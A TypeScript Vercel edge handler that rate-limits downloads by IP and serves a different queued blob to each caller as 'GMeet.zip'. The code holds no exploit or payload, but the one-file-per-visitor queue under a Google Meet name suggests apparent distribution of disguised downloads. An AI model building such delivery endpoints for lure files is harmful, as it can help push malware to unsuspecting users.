import { kv } from '@vercel/kv';
import { put, del, list } from '@vercel/blob';

const EXEMPT_IPS = new Set(['162.220.10.108', '162.220.10.85']);
const RATE_LIMIT = 3;
const RATE_WINDOW_SECONDS = 3600;
const FILE_QUEUE_KEY = 'download_queue';

function getClientIp(request: Request): string {
  const forwarded = request.headers.get('x-forwarded-for');
  if (forwarded) return forwarded.split(',')[0].trim();
  return request.headers.get('x-real-ip') || 'unknown';
}

async function checkRateLimit(ip: string): Promise<{ allowed: boolean; ttl: number }> {
  if (EXEMPT_IPS.has(ip)) return { allowed: true, ttl: 0 };

  const key = `ratelimit:${ip}`;
  const current = await kv.get<number>(key);
  const count = (current || 0) + 1;

  if (count > RATE_LIMIT) {
    const ttl = await kv.ttl(key);
    return { allowed: false, ttl: ttl > 0 ? ttl : RATE_WINDOW_SECONDS };
  }

  if (count === 1) {
    await kv.set(key, count, { ex: RATE_WINDOW_SECONDS });
  } else {
    await kv.incr(key);
  }
  return { allowed: true, ttl: RATE_WINDOW_SECONDS };
}

async function getNextBlobUrl(): Promise<{ url: string; pathname: string } | null> {
  const pathname = await kv.lpop(FILE_QUEUE_KEY);
  if (!pathname) return null;

  const { blobs } = await list({ prefix: pathname as string, limit: 1 });
  if (blobs.length === 0) {
    return getNextBlobUrl();
  }
  return { url: blobs[0].url, pathname: blobs[0].pathname };
}

export default async function handler(request: Request) {
  const ip = getClientIp(request);
  const { allowed, ttl } = await checkRateLimit(ip);

  if (!allowed) {
    const minutes = Math.ceil(ttl / 60);
    return new Response(
      JSON.stringify({
        error: 'rate_limited',
        message: `This IP has been rate limited from downloading. Try again in ${minutes} minute${minutes !== 1 ? 's' : ''}.`,
        retryAfter: ttl,
      }),
      {
        status: 429,
        headers: {
          'Content-Type': 'application/json',
          'Retry-After': String(ttl),
          'Access-Control-Allow-Origin': '*',
        },
      }
    );
  }

  const blob = await getNextBlobUrl();
  if (!blob) {
    return new Response(
      JSON.stringify({ error: 'no_files', message: 'No files available for download.' }),
      { status: 503, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
    );
  }

  try {
    const response = await fetch(blob.url);
    if (!response.ok) throw new Error('Failed to fetch from Blob');

    return new Response(response.body, {
      headers: {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="GMeet.zip"',
        'Content-Length': response.headers.get('Content-Length') || '',
        'Access-Control-Allow-Origin': '*',
      },
    });
  } catch (error) {
    console.error('Download error:', error);
    await kv.rpush(FILE_QUEUE_KEY, blob.pathname);
    return new Response(
      JSON.stringify({ error: 'server_error', message: 'Failed to start download.' }),
      { status: 500, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
    );
  }
}

export const config = { runtime: 'edge' };